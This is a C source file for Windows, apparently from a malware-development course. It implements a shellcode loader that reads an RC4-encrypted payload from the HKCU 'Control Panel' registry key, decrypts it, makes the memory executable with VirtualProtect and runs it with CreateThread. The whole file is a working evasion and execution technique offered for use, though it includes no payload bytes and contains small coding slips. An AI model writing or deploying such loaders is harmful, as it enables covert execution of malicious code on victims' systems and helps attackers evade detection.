#include<stdio.h>
#include<windows.h>
#include<winreg.h>


typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}

#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"

BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {

    LSTATUS     STATUS = NULL;
    DWORD       dwBytesRead = sPayloadSize;
    PVOID       pBytes = NULL;


    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (pBytes == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    if (sPayloadSize != dwBytesRead) {
        printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
        return FALSE;
    }

    *ppPayload = pBytes;

    return TRUE;
}

BOOL RunShellcode(PBYTE encryptedData, size_t sizeShellcode) {

	LPVOID memory_address = VirtualAlloc(NULL, sizeShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
		// [in, optional] LPVOID lpAddress,
		// [in]           SIZE_T dwSize,
		// [in]           DWORD  flAllocationType,
		// [in]           DWORD  flProtect
	);

	// load shellcode into memory
	RtlMoveMemory(memory_address, encryptedData, sizeShellcode
		// _Out_       VOID UNALIGNED *Destination,
		// _In_  const VOID UNALIGNED *Source,
		// _In_        SIZE_T         Length
	);

	// make shellcode executable
	DWORD old_protection = 0;
	BOOL returned_vp = VirtualProtect(memory_address, sizeShellcode, PAGE_EXECUTE_READ, &old_protection
		// [in]  LPVOID lpAddress,
		// [in]  SIZE_T dwSize,
		// [in]  DWORD  flNewProtect,
		// [out] PDWORD lpflOldProtect
	);

	// execute thread
	if (returned_vp != NULL) {
		HANDLE thread_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)memory_address, NULL, NULL, NULL
			// [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
			// [in]            SIZE_T                  dwStackSize,
			// [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
			// [in, optional]  __drv_aliasesMem LPVOID lpParameter,
			// [in]            DWORD                   dwCreationFlags,
			// [out, optional] LPDWORD                 lpThreadId
		);

		// waite for thread to complete
		WaitForSingleObject(thread_handle, INFINITE
			// [in] HANDLE hHandle,
			// [in] DWORD  dwMilliseconds
		);
	}
	else {
		return FALSE;
	}


    return TRUE;
}




int main() {
    size_t sPayloadSize = 272;
    PBYTE ppPayload = NULL;
    ReadShellcodeFromRegistry(sPayloadSize, &ppPayload);
  
	printf("\n ");
	Rc4Context ctx = { 0 };

	// Key used for encryption
	unsigned char key[] = { 0xF1, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xEC, 0x20, 0x41, 0x52, 0xFF };

	// Initialize the RC4 context with the key
	rc4Init(&ctx, key, sizeof(key));

	// Buffer to store the encrypted data
	unsigned char encryptedData[272];

	// Encryption
	rc4Cipher(&ctx, ppPayload, encryptedData, 272);

	for (size_t i = 0; i < sizeof(encryptedData); i++) {
		printf("0x%02X ", encryptedData[i]);
	}

	RunShellcode(encryptedData,sizeof(encryptedData));
}